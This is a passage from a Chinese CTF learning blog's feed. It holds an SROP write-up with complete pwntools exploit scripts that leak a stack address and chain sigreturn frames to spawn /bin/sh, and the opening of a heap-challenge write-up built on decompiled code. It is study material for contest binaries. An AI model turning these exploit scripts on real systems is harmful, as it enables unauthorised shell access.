title=\"1.泄露地址\"></a>1.泄露地址</h3><p>​\t\t因为ret后从rsp取值,所以rsp这里要放几个程序的起始地址start_addr,然后首先要利用write输出栈的地址,可以看到这两句指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rsi,rsp</span><br><span class=\"line\">mov rdi,rax</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t如果利用之前的read把rax控制为1,那么就可以调用write的系统调用了,而rsi正好是rsp,所以可以输出一个rsp中的一个栈指针,理论上也是指向栈的某个位置.</p>\n<p>​\t\t<strong>要执行write的话,需要跳过xor这条指令,所以是不是应该在rsp上放一个0x400b3,也就是xor下一条指令的地址呢? 理论上需要,其实也不用,因为在输入一个字符的时候,可以输入\\xb3, 这样把rsp上原先存放的start_addr地址的最后一个字节改了,也可以实现这个效果</strong></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729115321236.png\" alt=\"image-20230729115321236\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(<span class=\"string\">&#x27;\\xb3&#x27;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t在输出的时候可以看到第二个地址才是栈上地址,所以取值[8:16], <strong>为啥rsp上面要放3三个初始地址呢?</strong></p>\n<p>​\t\t第一个用来读入 \\xb3,  第二个时 进入了write,泄露地址, 第三个该继续走下面流程了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729164917698.png\" alt=\"image-20230729164917698\"></p>\n<p>​\t\t</p>\n<h3 id=\"2-构造frame-实现读入已知地址的功能\"><a href=\"#2-构造frame-实现读入已知地址的功能\" class=\"headerlink\" title=\"2.构造frame: 实现读入已知地址的功能\"></a>2.构造frame: 实现读入已知地址的功能</h3><p>​\t\t刚开始非常纳闷…这段汇编给的就是read的汇编,为啥要用frame构造啊….<font color=\"red\">后来想明白后,还是自己太想当然了,前面给的read的汇编是不知道rsp的地址的,通过构造的frame,在恢复的时候,可以指定rsp的值,这样才能知道&#x2F;bin&#x2F;sh的地址(或许可以暴力破解?</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## set rax=15 and call sigreturn</span></span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">7</span></span><br><span class=\"line\">sh.send(sigreturn)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t7个b不会影响吗??? 会覆盖sigframe的开头,<font color=\"red\">但是不知道覆盖的哪个寄存器????,不过看结果是没影响的</font></p>\n<h3 id=\"3-读如execve的frame-然后执行\"><a href=\"#3-读如execve的frame-然后执行\" class=\"headerlink\" title=\"3. 读如execve的frame,然后执行\"></a>3. 读如execve的frame,然后执行</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr + <span class=\"number\">0x120</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">payload = frame_payload + (<span class=\"number\">0x120</span>-<span class=\"built_in\">len</span>(frame_payload))*<span class=\"string\">b&#x27;\\x00&#x27;</span>+<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.send(sigreturn)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t与2原理一样,读入frame,然后执行</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">small = ELF(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">7777</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    sh = process(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(sh)</span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">syscall_ret = <span class=\"number\">0x00000000004000BE</span></span><br><span class=\"line\">start_addr = <span class=\"number\">0x00000000004000B0</span></span><br><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(<span class=\"string\">&quot;\\xb3&quot;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr + <span class=\"number\">0x120</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">pause()</span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">payload = frame_payload + (<span class=\"number\">0x120</span>-<span class=\"built_in\">len</span>(frame_payload))*<span class=\"string\">b&#x27;\\x00&#x27;</span>+<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"暴力破解解法\"><a href=\"#暴力破解解法\" class=\"headerlink\" title=\"暴力破解解法\"></a>暴力破解解法</h2><p>​\t\t不过这个解法也是基于在本地能大概看一下偏移差多少的情况下，如果直接暴力破解的话，难度应该会更大一点</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729210328031.png\" alt=\"image-20230729210328031\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">small = ELF(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">syscall_ret = <span class=\"number\">0x00000000004000BE</span></span><br><span class=\"line\">start_addr = <span class=\"number\">0x00000000004000B0</span></span><br><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">sh.send(<span class=\"string\">b&quot;\\xb3&quot;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr  -<span class=\"number\">0xa1f</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">b&quot;c&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">payload = frame_payload + <span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>*<span class=\"number\">90</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>gdb中如何查看 sigframe结构?</p>\n<p>gdb查看结构体信息</p>\n<p><a href=\"https://wizardforcel.gitbooks.io/100-gdb-tips/content/set-print-pretty-on.html\">https://wizardforcel.gitbooks.io/100-gdb-tips/content/set-print-pretty-on.html</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/",
            "title": "pwn入门-35-7月月赛pwn",
            "date_published": "2023-07-28T10:43:04.000Z",
            "content_html": "<p>题目链接: 本链接+&#x2F;pwn</p>\n<p>​\t\t一上来能看到是一个很明显的菜单堆题,并且有后门函数,很明显要劫持控制流,执行后门函数,但问题是没找到通用的漏洞,但是能看到add中,有很大一串逻辑,后来也看到了这里有关于后门函数的操作,以及存放puts函数的地址. </p>\n<p>​\t\t确定思路大概是想办法操作堆块位置,布置好位置,把后门函数放到puts函数的位置,然后调用就可以了.</p>\n<p>​\t\t不过后面看这逻辑看迷糊了….其实挺简单的逻辑, <font color=\"red\">注意两点,一点是可以辅助画图,来帮助自己分析,另外一点是通过调试来帮助自己分析, 只用脑子想…脑子可能不太够用..</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">....</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;size:&quot;</span>);</span><br><span class=\"line\">  size = <span class=\"number\">0</span>;</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0x200</span> &amp;&amp; size &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( size_4 = <span class=\"number\">0</span>; size_4 &lt;= <span class=\"number\">1</span>; ++size_4 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !*((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        dword_4068[<span class=\"number\">4</span> * size_4] = size;</span><br><span class=\"line\">        *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;malloc error&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        **((_QWORD **)&amp;ptrs + <span class=\"number\">2</span> * size_4) = &amp;<span class=\"built_in\">puts</span>;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;content:&quot;</span>);</span><br><span class=\"line\">        v7 = read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)(*((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) + <span class=\"number\">8LL</span>), size - <span class=\"number\">8</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v7 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">          *(_BYTE *)(v7 + <span class=\"number\">7LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4)) = <span class=\"number\">0</span>;</span><br><span class=\"line\">        v1 = *(_WORD *)(v7 + <span class=\"number\">14LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\">        v8 = magicffff;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v1 == <span class=\"number\">8995</span> )</span><br><span class=\"line\">          v8 = *(<span class=\"type\">unsigned</span> __int64 (**)())(v7 + <span class=\"number\">8LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">7</span>; ++i )</span><br><span class=\"line\">          *(_BYTE *)(v7 + (__int64)i + <span class=\"number\">8</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4)) = ((__int64)v8 &gt;&gt; (<span class=\"number\">8</span> * (<span class=\"type\">unsigned</span> __int8)i)) ^ <span class=\"number\">0x23</span>;</span><br><span class=\"line\">        v2 = *(_WORD *)(v7 + <span class=\"number\">22LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\">        v8 = magicffff;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v2 == <span class=\"number\">12850</span> )</span><br><span class=\"line\">          v8 = *(<span class=\"type\">unsigned</span> __int64 (**)())(v7 + <span class=\"number\">16LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">7</span>; ++j )</span><br><span class=\"line\">          *(_BYTE *)(v7 + (__int64)j + <span class=\"number\">16</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4)) = ((__int64)v8 &gt;&gt; (<span class=\"number\">8</span> * (<span class=\"type\">unsigned</span> __int8)j)) ^ <span class=\"number\">0x32</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v9;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v9;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t比较关键的几条语句如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">**((_QWORD **)&amp;ptrs + <span class=\"number\">2</span> * size_4) = &amp;<span class=\"built_in\">puts</span>;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这一条把堆块数据区开头8字节赋值了puts函数的地址</p>\n<p>​\t\t然后从第8字节开始读入剩下的数据</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v7 = read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)(*((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) + <span class=\"number\">8LL</span>), size - <span class=\"number\">8</span>);</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t下面这两句刚开始没看懂,一直在想怎么样才能满足这个条件呢,这条语句的意思是,判断输入的数据后面第6字节是否等于8995, 14可以拆成两个来看 8 + 6, 8代表了puts的8字节, 6就是剩下的6字节, 然后判断这个地址的值是否等于8995,<font color=\"red\">8995这样的数还是切换成16进制比较好! 因为在gdb中显示的基本都是16进制,这可能也是自己没判断出来相关关系的一个原因</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1 = *(_WORD *)(v7 + <span class=\"number\">14LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v1 == <span class=\"number\">8995</span> )       v1 == <span class=\"number\">0x2323</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t其实看不太懂没关系,完全可以在gdb中调试的时候发现端倪,在那两次奇怪的xor之后,能够看到符合条件的两个值,0x2323和0x3232</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230728215445598.png\" alt=\"image-20230728215445598\"></p>\n<p>​\t\t也就是说可以调整位置让程序符合这个判断条件,符合判断条件有什么用呢?</p>\n<p>​\t\t如果不符合条件,v8仍然是后门函数的地址,那么xor后,仍然是一个无效地址,<font color=\"red\">但如果已经xor过一次,通过进入0x2323的执行流,把v8的值设置为xor过一次的地址,那么再次xor后,就恢复原样了!就得到后门函数了</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> v8 = magicffff;       </span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v1 == <span class=\"number\">0x2323</span> )</span><br><span class=\"line\">          v8 = *(<span class=\"type\">unsigned</span> __int64 (**)())(v7 + <span class=\"number\">8LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">7</span>; ++i )</span><br><span class=\"line\">          *(_BYTE *)(v7 + (__int64)i + <span class=\"number\">8</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4)) = ((__int64)v8 &gt;&gt; (<span class=\"number\">8</span> * (<span class=\"type\">unsigned</span> __int8)i)) ^ <span class=\"number\">0x23</span>;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"具体步骤\"><a href=\"#具体步骤\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h1><ol>\n<li>刚开始两次add, 都添加大小为32的块，</li>\n</ol>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727120328851.png\" alt=\"image-20230727120328851\"></p>\n<ol start=\"2\">\n<li>删除0号块</li>\n</ol>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727120539022.png\" alt=\"image-20230727120539022\"></p>\n<ol start=\"3\">\n<li>申请40大小的块（32行吗？32不行，32的话，用不了下一个chunk的prev_size字段），输入31个a（不是32是因为后面会补一个0x00），然后后面两个8字节就被xor了，后面两个8字节，一个是size，一个是存放puts函数地址的，这样的话，就把magic xor后的数值存放到了这里， 所以后面的问题是如何解xor，当时也卡在了这里</li>\n</ol>\n<p>其实在调试中仔细观察的话（所以不能光空想！） 会发现有0x2323 0x3232，正好可以进入到两个判断条件中，  </p>\n<p>后面再进入0x23， 两次xor就回到原先的值了！</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727120606798.png\" alt=\"image-20230727120606798\"></p>\n<ol start=\"4\">\n<li>再次释放0</li>\n</ol>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727170913465.png\" alt=\"image-20230727170913465\"></p>\n<ol start=\"5\">\n<li>再次申请0 40,并填满</li>\n</ol>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230727170922279.png\" alt=\"image-20230727170922279\"></p>\n<ol start=\"6\">\n<li>show 1 就可以了</li>\n</ol>\n<p>奥。。。明白为什么比赛的时候做题没做出来了。。没有看懂关键逻辑（以及想当然的以为xor后的东西看着一连串一样的，以为没啥用，其实地址0x55555当然很多一样的了。。）。。就像之前的那道题一样，都不需要写脚本，看懂逻辑了直接交互就可以了</p>\n<p>关键逻辑在add里面</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/image-20230728220659543.png\" alt=\"image-20230728220659543\"></p>\n<h2 id=\"偷一下exp\"><a href=\"#偷一下exp\" class=\"headerlink\" title=\"偷一下exp\"></a>偷一下exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 